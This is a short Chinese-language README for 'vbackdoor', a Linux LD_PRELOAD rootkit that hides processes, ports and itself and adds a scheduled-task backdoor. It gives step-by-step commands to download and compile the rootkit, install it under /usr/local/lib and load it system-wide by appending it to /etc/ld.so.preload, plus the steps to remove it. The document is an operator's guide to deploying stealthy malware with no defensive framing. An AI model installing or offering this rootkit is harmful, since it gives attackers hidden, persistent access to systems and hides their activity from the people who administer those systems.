# vbackdoor
使用 LD_PRELOAD rootkit 技术进行隐藏进程、隐藏端口、后门添加、自我隐藏

### 编译（使用时修改vbackdoor.c内容）

```
git clone https://github.com/veo/vbackdoor.git
cd vbackdoor
vi vbackdoor.c
make
sudo mv vbackdoor.so /usr/local/lib/
```

或者

```
wget https://raw.githubusercontent.com/veo/vbackdoor/main/vbackdoor.c
vi vbackdoor.c
gcc -Wall -fPIC -shared -o vbackdoor.so vbackdoor.c -ldl
sudo mv vbackdoor.so /usr/local/lib/
```

### 载入后门

```
echo /usr/local/lib/vbackdoor.so >> /etc/ld.so.preload
```

### 卸载后门

```
vi /etc/ld.so.preload
```
并删除内容 /usr/local/lib/vbackdoor.so

或者

使用busybox

```
busybox rm -rf /etc/ld.so.preload
```

  * 进程隐藏
  * LD_PRELOAD 隐藏
  * 端口隐藏
  * 计时任务后门
